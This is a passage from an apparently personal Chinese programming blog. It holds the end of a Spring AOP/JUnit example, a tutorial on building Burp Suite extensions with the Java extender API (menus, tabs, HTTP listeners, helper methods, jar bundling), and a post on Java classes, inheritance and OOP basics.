        return object;
    }
}
</code></pre><p>3.applicationContext.xml(关键)            </p>
<pre><code>//扫描aspect与service包,定位业务类与切面类
&lt;context:component-scan base-package=&quot;aspect&quot;/&gt;
&lt;context:component-scan base-package=&quot;service&quot;/&gt; 

//找到被注解了的切面类,进行切面设置
&lt;aop:aspectj-autoproxy/&gt; 
</code></pre><p>4.TestSpring.java与上一个xml设置的代码相同。<br>运行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.19.56.37-image.png" alt="2019-01-10.19.56.37-image.png">        </p>
<h3 id="AOP注解方式测试"><a href="#AOP注解方式测试" class="headerlink" title="AOP注解方式测试"></a>AOP注解方式测试</h3><p>1.jar包下载:<br><a href="http://how2j.cn/frontdownload?bean.id=1189" target="_blank" rel="noopener">jubit.jar</a><br><a href="http://how2j.cn/frontdownload?bean.id=1190" target="_blank" rel="noopener">hamcrest.jar</a></p>
<p>2.applicationContext.xml</p>
<pre><code>&lt;context:component-scan base-package=&quot;pojo&quot;/&gt;
</code></pre><p>3.Source.java</p>
<pre><code>package pojo;

import org.springframework.stereotype.Component;

@Component(&quot;s&quot;)
public class Source {
    private int id;
    private String name = &quot;test2&quot;;

public int getId() {
    return id;
}
public void setId(int id) {
    this.id = id;
}
public String getName() {
    return name;
}
public void setName(String name) {
    this.name = name;
}
</code></pre><p>}</p>
<p>3.TestSpring.java</p>
<pre><code>package test;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

import pojo.Source;
import service.ProductService;

@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(&quot;classpath:applicationContext.xml&quot;)
public class TestSpring {

@Autowired
Source s;

@Test
public void test() {
    System.out.println(s.getName());
    }
}
</code></pre><p>运行结果：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.20.37.25-image.png" alt="2019-01-10.20.37.25-image.png">        </p>
<p>参考:<br><a href="https://www.imooc.com/learn/196" target="_blank" rel="noopener">https://www.imooc.com/learn/196</a><br><a href="http://how2j.cn/k/spring/spring-ioc-di/87.html" target="_blank" rel="noopener">http://how2j.cn/k/spring/spring-ioc-di/87.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/09/Burp插件开发/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/09/Burp插件开发/" itemprop="url">Burp插件开发</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-09T08:15:41+08:00">
                2019-01-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近学习Java,想起以前大佬写的Burp插件,就照猫画虎写了几个简单的插件,简单记录下过程。</p>
</blockquote>
<hr>
<p>关于Java基础语法移步笔者以前文章：<a href="https://p0rz9.github.io/2019/01/08/Java语法基础/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/01/08/Java语法基础/</a></p>
<h3 id="Java接口"><a href="#Java接口" class="headerlink" title="Java接口"></a>Java接口</h3><h4 id="接口简介"><a href="#接口简介" class="headerlink" title="接口简介"></a>接口简介</h4><blockquote>
<p>接口（英文：Interface）在 Java 编程语言中是一个比较抽象的东西。熟悉 OOP 的同学可以用”类”的思想来理解接口。但是，要明白的是，类与接口有相似的地方同时也有很多不同的地方。</p>
</blockquote>
<h4 id="接口的声明"><a href="#接口的声明" class="headerlink" title="接口的声明"></a>接口的声明</h4><p>接口的声明语法格式如下：</p>
<pre><code>[可见度] interface 接口名称 [extends 其他的类名] {
        // 声明变量
        // 抽象方法
}
</code></pre><p>Burp的接口声明</p>
<pre><code>package burp;
public interface IBurpExtender
{
    void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks);
}
</code></pre><h4 id="接口的实现"><a href="#接口的实现" class="headerlink" title="接口的实现"></a>接口的实现</h4><blockquote>
<p>一个接口可以被另外一个接口继承，也可以被一个类实现。当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。类使用implements关键字实现接口。</p>
</blockquote>
<p>实现接口的语法    </p>
<pre><code>#!java
... implements 接口名称[, 其他接口1, 其他接口2..., ...] ...
</code></pre><hr>
<h3 id="编写Burp插件"><a href="#编写Burp插件" class="headerlink" title="编写Burp插件"></a>编写Burp插件</h3><p>编写插件应该分为三步,导入Burp提供接口—&gt;编写功能代码—&gt;导入插件</p>
<h4 id="导入Burp插件接口"><a href="#导入Burp插件接口" class="headerlink" title="导入Burp插件接口"></a>导入Burp插件接口</h4><p>1.将Burp提供的接口文件(Burp目录)导入Java项目中<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.28.35-image.png" alt="2019-01-09.16.28.35-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.30.37-image.png" alt="2019-01-09.16.30.37-image.png"></p>
<h4 id="编写插件代码"><a href="#编写插件代码" class="headerlink" title="编写插件代码"></a>编写插件代码</h4><p>新建一个BurpExtender.java文件,这是编写插件必须要写的一个类,然后编写所要实现功能的代码</p>
<h4 id="导出Jar文件并加载插件"><a href="#导出Jar文件并加载插件" class="headerlink" title="导出Jar文件并加载插件"></a>导出Jar文件并加载插件</h4><p>将上一步编写完成的插件,打包导入<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.40.25-image.png" alt="2019-01-09.16.40.25-image.png"></p>
<h3 id="BurpSuite官方接口"><a href="#BurpSuite官方接口" class="headerlink" title="BurpSuite官方接口"></a>BurpSuite官方接口</h3><p>其中最重要的就是编写代码部分,首先注意:<br>编写Burp插件必须编写BurpExtender类，实现接口IBurpExtender且声明为<code>public</code><br>IBurpExtender实现接口IBurpExtender,IProxyListener的demo:    </p>
<pre><code>package burp;
public class BurpExtender implements IBurpExtender{

  // 实现 IBurpExtender 接口的 registerExtenderCallbacks 方法
  @Override
  public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
      // TODO here
  }
}
</code></pre><p>Burp提供的接口类说明文档:<a href="https://portswigger.net/burp/extender/api/index.html" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html</a><br>下面根据接口功能的不同对接口进行分类：</p>
<p>1.插件入口和帮助接口类:<code>IBurpExtender、IBurpExtenderCallbacks、 IExtensionHelpers、IExtensionStateListener</code></p>
<pre><code>IBurpExtender接口类是Burp插件的入口，所有Burp的插件均需要实现此接口，并且 类命名为BurpExtender。IBurpExtenderCallbacks接口类是IBurpExtender接口的实现类与Burp其他各个组件（Scanner、Intruder、Spider……）、各个通信对象 （HttpRequestResponse、HttpService、SessionHandlingAction）之间的连接。 IExtensionHelpers、IExtensionStateListener这两个接口类是插件的帮助和管理操作的接口定义。IBurpExtender、IBurpExtenderCallbacks、 IExtensionHelpers、IExtensionStateListener
</code></pre><p>2.UI相关接口类:<code>IContextMenuFactory、IContextMenuInvocation、ITab、ITextEditor、 IMessageEditor、IMenuItemHandler</code></p>
<pre><code>这类接口类主要是定义Burp插件的UI显示和动作的处理事件，主要是软件交互中使用。
</code></pre><p>3.Burp工具组件接口类:<code>IInterceptedProxyMessage、IIntruderAttack、 IIntruderPayloadGenerator、IIntruderPayloadGeneratorFactory、 IIntruderPayloadProcessor、IProxyListener、IScanIssue、IScannerCheck、 IScannerInsertionPoint、IScannerInsertionPointProvider、IScannerListener、IScanQueueItem、IScopeChangeListener</code></p>
<pre><code>这些接口类的功能非常好理解，Burp在接口定义的命名中使用了的见名知意的规范，看到接口类的名称，基本就能猜测出来这个接口是适用于哪个工具组件。
</code></pre><p>4.HTTP消息处理接口类：<code>ICookie、IHttpRequestResponsePersisted、IHttpRequestResponseWithMarkers、IHttpService、 IRequestInfo、IParameter、IResponseInfo</code></p>
<pre><code>这些接口的定义主要是围绕HTTP消息通信过程中涉及的Cookie、Request、 Response、Parameter几大消息对象，通过对通信消息头、消息体的数据处理，来达到控制HTTP消息传递的目的。
</code></pre><h4 id="几个写插件常用的接口"><a href="#几个写插件常用的接口" class="headerlink" title="几个写插件常用的接口:"></a>几个写插件常用的接口:</h4><p>1.<code>registerExtenderCallbacks</code>是IBurpExtender接口的实现类,与Burp的其他组件(Scanner Intruder Spider)及通信对象连接(HttpRequestResponse HttpService SessionHandlingAction)之间的连接。</p>
<p>2.HTTP消息处理接口类:IHttpListener(注册Http监听器)  </p>
<pre><code>//注册Http监听器
public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
{    
//toolFlag:指示了发起请求或收到响应的 Burp 工具的 ID，所有的 toolFlag 定义在 IBurpExtenderCallbacks 接口中。
//messageIsRequest:指示该消息是请求消息（值为True）还是响应消息（值为False）
//messageInfo:被处理的消息的详细信息，是一个 IHttpRequestResponse 对象
}
</code></pre><p>3.<code>IHttpRequestResponse</code>类</p>
<pre><code>byte[] request_by = messageInfo.getRequest();
byte[] response = messageInfo.getResponse();
IHttpService httpService = messageInfo.getHttpService();
String Highlight = messageInfo.getHighlight();
String Comment = messageInfo.getComment();
</code></pre><p>4.<code>IHttpListener</code>接口<br>可通过调用IBurpExtenderCallbacks.registerHttpListener()注册一个HTTP监听器,Burp的任何一个接口发起HTTP请求或者收到HTTP响应都会通知此监听器。该接口可得到这些交互数据,进行分析和修改。<br>方法:        </p>
<pre><code>void processHttpMessage(int toolFlag,boolean messageIsRequest,IHttpRequestResponse messageInfo);
参数:toolFlag  发起或收到请求的插件ID,所有的ID已经在IBurpExtenderCallbacks定义好了。
    boolean messageISRequest 提示该消息是请求消息(True)还是响应消息（False）
    IHttpRequestResponse messageInfo 被处理的消息的详细消息,是一个IHttpRequestResponse对象
</code></pre><p>5.<code>IContextMenuFactory</code>类实现菜单效果</p>
<pre><code>package burp;

import java.util.ArrayList;
import java.util.List;
import javax.swing.JMenu;
import javax.swing.JMenuItem;

public class BurpExtender implements IBurpExtender, IContextMenuFactory{

@Override
public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks){

    //插件名称
    callbacks.setExtensionName(&quot;Her0in&quot;);

    //注册菜单
    callbacks.registerContextMenuFactory(this);
}


@Override
public List&lt;JMenuItem&gt; createMenuItems(final IContextMenuInvocation invocation) {

    List&lt;JMenuItem&gt; listMenuItems = new ArrayList&lt;JMenuItem&gt;();

    //子菜单
    JMenuItem menuItem;
    menuItem = new JMenuItem(&quot;子菜单&quot;);  

    //父级菜单
    JMenu jMenu = new JMenu(&quot;父菜单&quot;);

    //菜单操作
    jMenu.add(menuItem);        
    listMenuItems.add(jMenu);


    return listMenuItems;
}


@Override
public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo,
        BurpExtender helpers) {
    // TODO Auto-generated method stub

}
</code></pre><p>}</p>
<p>加载插件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.16.22.20-image.png" alt="2018-12-11.16.22.20-image.png"></p>
<p>查看效果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.16.23.21-image.png" alt="2018-12-11.16.23.21-image.png"></p>
<p>6.<code>ICookie</code>接口    </p>
<pre><code>// 此方法用于获取 Cookie 的域
java.lang.String    getDomain()

// 此方法用于获取 Cookie 的过期时间
java.util.Date  getExpiration()

// 此方法用于获取 Cookie 的名称
java.lang.String    getName()

// 此方法用于获取 Cookie 的路径
java.lang.String    getPath()

// 此方法用于获取 Cookie 的值
java.lang.String    getValue()
</code></pre><p>7.<code>IExtensionHelpers</code>接口:<br>此接口提供很多常用的辅助方法,可通过调用<code>IBurpExtenderCallbacks.getHelpers</code>获得此接口的实例。    </p>
<pre><code>byte[]  addParameter(byte[] request, IParameter parameter) //添加参数到指定的请求中,并更新Content-Length

IRequestInfo analyzeRequest(byte[] request)  //分析request的请求信息
IResponseInfo analyzeResponse(byte[] response)  //分析response的响应消息

byte[]  buildHttpMessage(java.util.List&lt;java.lang.String&gt; headers, byte[] body)  //构建请求包,返回响应报


byte[]  buildHttpRequest(java.net.URL url) //向指定的url发起get请求
java.lang.String    bytesToString(byte[] data)   //bytes到String的转换
java.lang.String    bytesToString(byte[] data)   //String到bytes的转换


实例：
private IExtensionHelpers helpers;

this.helpers = callbacks.getHelpers();

byte[] request = messageInfo.getRequest();
IRequestInfo a = helpers.analyzeRequest(request);
</code></pre><p>8.<code>IHttpRequestResponse</code>接口<br>该接口用于检索与更新有关HTTP消息的详细信息    </p>
<pre><code>java.lang.String getComment()          //获取用户的标注信息
java.lang.String getHighlight()       /获取用户标注的高亮信息
IHttpService getHttpService()   //获取请求响应的http服务信息    

byte[]  getRequest()  // 获取 HTTP 请求信息
byte[]  getResponse()  // 获取 HTTP 响应信息

void    setHttpService(IHttpService httpService)  //更新请求/响应HTTP服务信息
void    setRequest(byte[] message)    // 更新 HTTP 请求信息
void    setResponse(byte[] message)  // 更新 HTTP 响应信息
</code></pre><p>9.<code>IHttpService</code>接口<br>此接口用于提供关于 HTTP 服务信息的细节    </p>
<pre><code>java.lang.String getHost()    
int getPort()    
java.lang.String getProtocol()    


例子:
public void processHttpMessage(int toolFlag, boolean messageIsRequest,
        IHttpRequestResponse messageInfo) {

    IHttpService iHttpService = messageInfo.getHttpService();

    this.stdout.println(&quot;Host:&quot;+iHttpService.getHost());
    this.stdout.println(&quot;Port:&quot;+iHttpService.getPort());
    this.stdout.println(&quot;Protocol:&quot;+iHttpService.getProtocol());
}
</code></pre><p>在放掉拦截的数据包后,效果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.18.01.11-image.png" alt="2018-12-11.18.01.11-image.png"></p>
<p>10.<code>IInterceptedProxyMessage</code>接口<br>该接口不能被扩展实现,它表示已被Burp代理拦截的HTTP消息。我们可以利用接口注册一个IProxyListener以得到代理消息的细节。    </p>
<pre><code>callbacks.registerProxyListener(this);  //注册代理监听器

IHttpRequestResponse message1 = message.getMessageInfo();  //请求的详细信息
int action = message.getInterceptAction();      //当前的拦截操作类型    

//获取客户端的Ip,即代理Ip
stdout.println(message.getClientIpAddress());

//获取当前的拦截操作类型  
stdout.println(action);

//获取请求的详细信息
stdout.println(message1);

// Drop 掉所有请求
//message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
</code></pre><p>11.<code>Itab</code>接口:</p>
<pre><code>package burp;
import java.awt.Component;
import java.io.PrintWriter;

import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

public class BurpExtender implements IBurpExtender, ITab {
      public PrintWriter stdout;
      public IExtensionHelpers helpers;
      private JPanel jPanel1;
      private JButton jButton1;

  @Override
  public void registerExtenderCallbacks( final IBurpExtenderCallbacks callbacks) {

      this.stdout = new PrintWriter(callbacks.getStdout(), true);
      this.helpers = callbacks.getHelpers();

      //设置扩展名
      callbacks.setExtensionName(&quot;JSON劫持检测&quot;);

       //创建我们的窗体
       SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                 //我们的主窗体
                 jPanel1 = new JPanel();
                 jButton1 = new JButton(&quot;测试按钮&quot;);

                 //将按钮添加到面板中
                 jPanel1.add(jButton1);

                 //自定义我们的组件
                 callbacks.customizeUiComponent(jPanel1);
                 //添加标签到Burp主窗体
                 callbacks.addSuiteTab(BurpExtender.this);
            }
       });
  }
  @Override
  public String getTabCaption() {
       return &quot;JSON劫持检测&quot; ;
  }

  @Override
  public Component getUiComponent() {
       return jPanel1;
  }

@Override
public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo,
        BurpExtender helpers) {
    // TODO Auto-generated method stub        
}
}
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.22.21.12-image.png" alt="2018-12-11.22.21.12-image.png"></p>
<p>我们也可以学习官方插件代码,下载JD-GUI工具:<br><a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/JD-GUI.shtml" target="_blank" rel="noopener">https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/JD-GUI.shtml</a><br>在burpsuite安装目录下的bapps目录下存放已经安装的插件源代码,用下载的JD-GUI直接打开即可看到源码。</p>
<h3 id="实战编写"><a href="#实战编写" class="headerlink" title="实战编写"></a>实战编写</h3><p>Jsonp劫持插件:<br><a href="https://github.com/P0rZ9/Burp_Extender/tree/master/Json_Hijacking" target="_blank" rel="noopener">插件源码</a></p>
<p><a href="https://github.com/P0rZ9/Burp_Extender/raw/master/Json_Hijacking/Burp/Json_Hijacking.jar" target="_blank" rel="noopener">插件成品</a></p>
<p>Http请求入库插件:<br><a href="https://github.com/P0rZ9/Burp_Extender/tree/master/Http_to_Mysql/Http_to_Mysql" target="_blank" rel="noopener">插件源码</a></p>
<p><a href="https://github.com/P0rZ9/Burp_Extender/raw/master/Http_to_Mysql/Http_to_Mysql/http-to-mysql.jar" target="_blank" rel="noopener">插件成品</a></p>
<p><strong>注:如插件要导入其他扩展包,如需要使用数据库操作(需导入mysql-connector-java-bin.jar),在加载到Burp时应将几个Jar打包为一个文件:</strong></p>
<pre><code>1.将项目引入的jar包跟项目导出的包放入当前目录下
2..将包分别解压
  jar -xvf 1.jar
  jar -xvf 2.jar
  jar -xvf 引入的jar包
3.将所有jar包移出当前目录
4.将当前目录文件打包为一个jar文件
  jar -cvfM result.jar .   (别忘了.)
5.导入BurpSuite即可  
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/08/Java语法基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/08/Java语法基础/" itemprop="url">基础知识 | JAVA语法基础<一></a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-08T08:15:41+08:00">
                2019-01-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>终于忙完考试了,计划接下来的2周时间除了完成课设外,打算补下Java,读2本推理小说,接着更新博客。</p>
</blockquote>
<hr>
<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>Java是一种面向对象程序设计语言,所有的数据类型都是用类描述的,Java程序也是由若干个类组成的,想学好Java,类是必须要掌握的。</p>
<h3 id="类知识"><a href="#类知识" class="headerlink" title="类知识"></a>类知识</h3><h4 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h4><p>Java中的类分为类声明与类主体    </p>
<h5 id="类声明"><a href="#类声明" class="headerlink" title="类声明"></a>类声明</h5><pre><code>格式:`修饰符 class 类名 extends 父类名 implements 接口名`        
修饰符:可选,分为定义类的性质(abstract,final)和访问权限(public和默认等)    
extends:可选,继承父类,如无指定,默认继承Java.lang.Object,只支持单继承
implements:可选,用于指明该类实现的接口,允许一个类实现多个接口(,分割)。    
</code></pre><h5 id="类主体"><a href="#类主体" class="headerlink" title="类主体"></a>类主体</h5><p>包括成员变量与成员方法的定义与实现    </p>
<h5 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h5><p>格式:<code>变量修饰符 变量类型 变量名</code><br>变量类型为Java语言中任意的数据类型或引用数据类型(类,数组等),成员变量通过其变量修饰符来确定访问权限。</p>
<h5 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h5><p>格式:<code>方法修饰符 返回类型 方法名(参数列表)</code><br>方法修饰符:public,private,protected,final,static,abstract,synchronized。前三种说明访问权限,public(所有类都可以访问),private(只能被本类访问),protected(允许被相同包的类访问),final(修饰最终方法,被修饰过的方法不允许被子类重载),static(修饰类方法,可直接通过类名调用且不允许重载),abstract(修饰抽象方法,只有方法声明,无方法体),synchronized(修饰用于线程同步)。<br>返回类型:可以是基本数据类型或者自定义类,如不需要返回值,设置其为void即可。<br>方法名与参数列表:符合命名规范即可<br>方法体:定义功能,方法体内可定义局部变量,作用域仅在方法体内。</p>
<h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><p>当用new一个新对象时,构造方法立即执行,构造方法名必须与类名相同。    </p>
<pre><code>public 类名(参数列表){}
</code></pre><p>定义构造方法注意:<br>    1.无返回类型(包括void),修饰符只能为public,private,protected中的任一个<br>    2.不能从父类继承<br>    3.系统默认提供无参构造方法<br>    4.构造方法不能通过方法名直接调用,只能通过new运算符调用。<br>    5.构造方法可以调用当前类(this)或父类的构造方法(super),<code>必须在第一行调用</code>。</p>
<h4 id="类使用"><a href="#类使用" class="headerlink" title="类使用"></a>类使用</h4><h5 id="类声明-创建"><a href="#类声明-创建" class="headerlink" title="类声明,创建"></a>类声明,创建</h5><p>类是对象模板,只有实例化后才可使用。<br><code>Circle c1</code> //声明<br><code>Circle c1 = new Circle()</code> //new用于创建一个对象的实例并返回对象的引用。<br><code>c1.a(1,2)</code> //调用成员方法a(),参数为1,2    </p>
<h5 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h5><p>对象不再使用后,Java系统通过垃圾回收器GC,周期性地释放内存,回收工作由Java系统自动完成,减少程序员的工作量。    </p>
<h4 id="this的使用"><a href="#this的使用" class="headerlink" title="this的使用"></a>this的使用</h4><p>关键字this表示实例对象指向自己的引用,可出现再实例方法与构造方法中,不能出现在由static修饰的类方法(静态方法)。    </p>
<h5 id="实例方法和构造方法中使用this"><a href="#实例方法和构造方法中使用this" class="headerlink" title="实例方法和构造方法中使用this"></a>实例方法和构造方法中使用this</h5><p>this(color),this.h=h,this.cry() //调用本实例类的构造方法,成员变量与成员方法。</p>
<h5 id="区分成员变量与局部变量"><a href="#区分成员变量与局部变量" class="headerlink" title="区分成员变量与局部变量"></a>区分成员变量与局部变量</h5><p>成员变量在整个类中都有效,局部变量仅在方法体内有效。<code>在方法体内声明的变量与方法传入的参数称为局部变量。</code>如果在实例方法中的局部变量名字与成员变量名字相同,这个成员变量在这个方法内就会暂时失效(强龙压不过地头蛇),如果确实想引用成员变量,使用this关键字即可。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.30.00-image.png" alt="2019-01-08.11.30.00-image.png"></p>
<h5 id="返回实例对象本身的引用"><a href="#返回实例对象本身的引用" class="headerlink" title="返回实例对象本身的引用"></a>返回实例对象本身的引用</h5><p>this还可以作为成员方法的return语句的参数,用来返回对象本身的引用。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.35.39-image.png" alt="2019-01-08.11.35.39-image.png"><br>返回长大后的Dog类。    </p>
<h5 id="使用this调用类的其他构造方法"><a href="#使用this调用类的其他构造方法" class="headerlink" title="使用this调用类的其他构造方法"></a>使用this调用类的其他构造方法</h5><p>使用this调用其他类的构造方法(this(a)),至于系统具体会调用哪个方法,根据参数的类型与个数决定。    </p>
<h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p>OOP是Java的重点,OOP的三个特性</p>
<pre><code>封装:用一个类将实现与使用分开,只保留接口与外部进行联系
继承:字类自动继承其父类的属性与方法,并且可以添加新的属性与方法
多态:虽然多个子类都有一个共同的方法,但是子类实例化后都可以获得完全不同的结果
</code></pre><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><pre><code>面向对象程序设计的一个特性就是封装,将实体特征的属性隐藏起来,对象与外界仅通过公共方法进行交流,提高程序的可靠性,安全性与可维护性。数据的隐藏与开放对外的接口可通过访问权限控制符实现,Java提供了public,protected,private和默认4种访问控制符
public
    可被同一个或不同包的任何类访问通常只将公共类或公共接口的成员方法组指定为public
protected
    可用来修饰类的成员变量与方法,可被本类、本包的其他类访问,也可被其他包的字类继承
默认
    用户没有指定,就会自动使用默认权限,只能被本类或其他一个包中的其他类、接口、成员方法引用,也被称为包权限
pricate
    声明类的私有成员,被private修饰的成员变量和方法只能被该类自身所访问或修改,而不能被其他类(包括该类的子类)来获取或引用    
getInfo和setInfo    
    为了系统设计的安全性考虑,一般将类的成员变量定义为private形式,而将类的成员方法定义为public对外公开。类中提供变量对应的get方法(得到private成员变量)和set方法(修改private成员变量),达到其他类可以操作该类的private成员变量
</code></pre><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><pre><code>研究生是一类特殊的学生,研究生类在保留学生类的基本属性和行为的基础上,可以增加新的属性与行为,也可以修改学生的属性和行为。这里学生就是研究生的父类(或超类),研究生为学生的子类。父类派生子类,子类继承父类,子类也可以派生其他类,这样就构成了类的层次结构。继承机制可提高系统的可扩展性与可维护性。
</code></pre><h5 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h5><pre><code>class Graduate extends Student{    
使用extends关键字实现类的继承,如果类定义没有使用extends关键字,则默认该类的父类为java.lang.Object,Object类是Java预定义的所有类的父类，包含所有的Java使用的公共属性其中定义的属性与方法均可被任何类使用 继承或修改。Java只能继承一个父类(单继承),子类继承父类的变量和方法,可以增加父类没有的变量或方法,也可以修改已有的变量或方法。
用Eclipse打开Java文件,连按两次Ctrl+o,可得到当前类与父类的属性,方法:    
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2019-01-07.19.45.34-image.png" alt="2019-01-07.19.45.34-image.png"><br>    <code>子类可以继承父类的成员属性与方法,但受访问权限的限制。如父类与子类在不同的包中定义,子类只能public与protected权限的变量,如果父类与子类在一个包中定义,子类能访问父类的public,protected与默认权限的变量,如果要访问private类型的变量,只能使用其父类的set与get方法访问。</code></p>
<h5 id="super的使用"><a href="#super的使用" class="headerlink" title="super的使用"></a>super的使用</h5><p>子类在继承父类的属性与方法时,可能会出现变量隐藏(变量的名相同,类型不要求)或方法覆盖(子类与父类的方法名,返回类型,入口参数的数目,类型,顺序相同,只是实现的功能不同)。此时父类的变量与方法就会被覆盖,如需要调用父类被隐藏的属性与方法,可通过<code>super</code>关键字调用<br>eg:</p>
<pre><code>public class Student{
  public static void main(String[] args) {
      AClass aClass = new AClass();
      BClass bClass = new BClass();

      aClass.p1();
      bClass.p1();
      }
}
public class AClass {
    int a;
    float a1;

    public AClass() {
        a = 50;
        a1 = 99.99f;
    }
    public void p1() {
        System.out.println(&quot;method A&quot;);
        System.out.println(&quot;a=&quot;+a);
        }
}
public class BClass extends AClass{
    int a;    //与父类的成员变量名相同,属于变量隐藏
    public BClass() {
      a = 10;
      a1 = 123.6f;
  }
    public void p1() {    //与父类的成员方法相同,属于方法覆盖现象
      System.out.println(&quot;method b&quot;);
      System.out.println(&quot;a=&quot;+a);    //这里的a是bClass的变量a
      super.p1();     //通过super调用被覆盖的父类成员方法
      System.out.println(&quot;super.a=&quot;+super.a);    //通过super访问被隐藏的父类成员变量
  }
}
</code></pre><p>   运行结果:</p>
<pre><code>   method A
a=50
method b
a=10
method A
a=50
super.a=50
</code></pre><p><code>super</code>除上述的2种作用,还可显示调用父类构造方法。<br>    实例方法与构造方法的super关键字都指向父类,实例方法中的super关键字是去调用父类中的某个方法,而构造方法中使用是去调用父类的构造方法。</p>
<h5 id="子类对象的构造"><a href="#子类对象的构造" class="headerlink" title="子类对象的构造"></a>子类对象的构造</h5><p>当子类创建时,系统默认自动(显式或隐式)调用父类的无参构造方法。需要注意的是,如果父类定义了有参数的构造方法,系统就不会再提供默认的无参构造方法,此时子类一定要避免使用父类的无参构造方法。<br>调用构造方法时,遵循的规则:<br>    1.创建对象时,调用该类的父类构造方法(将第一条写为super语句即可),super可以调用父类的任何一个带参数或不带参数的构造方法。<br>    2.如果类的构造方法中第一条语句没有使用super,则编译器也会默认用super()调用父类的无参构造方法。<br>    3.用this()调用本类的构造方法。<br>    4.如父类定义了有参构造方法,子类的构造方法一定要super显式调用父类的有参构造方法。<br>所以说,在定义一个类时,如果没有特殊需求,尽量在类中定义一个无参的构造方法,防止被继承时出现错误。</p>
